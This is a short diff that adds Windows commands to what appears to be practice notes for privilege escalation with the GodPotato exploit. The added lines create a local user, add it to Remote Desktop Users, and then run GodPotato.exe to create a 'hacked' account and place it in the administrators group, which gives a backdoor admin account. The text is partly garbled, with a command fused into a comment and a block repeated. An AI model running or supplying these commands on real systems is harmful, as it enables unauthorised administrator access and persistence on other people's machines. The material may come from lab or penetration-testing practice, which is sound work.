@@ -20,3 +20,16 @@ cd C:\temp
 GodPotato.exe -cmd "whoami"
 
 net user lowpriv P@ssw0rd123! /add
+net user lowpriv
+net localgroup "Remote Desktop Users" lowpriv /add
+logoff
+runas /user:lowpriv cmd
+whoami
+whoami /priv
+cmd# Navigate to where GodPotato is
+cd C:\temp
+
+# Test exploitation
+GodPotato.exe -cmd "whoami"
+GodPotato.exe -cmd "cmd /c net user hacked P@ssw0rd! /add"
+GodPotato.exe -cmd "cmd /c net localgroup administrators hacked /add"
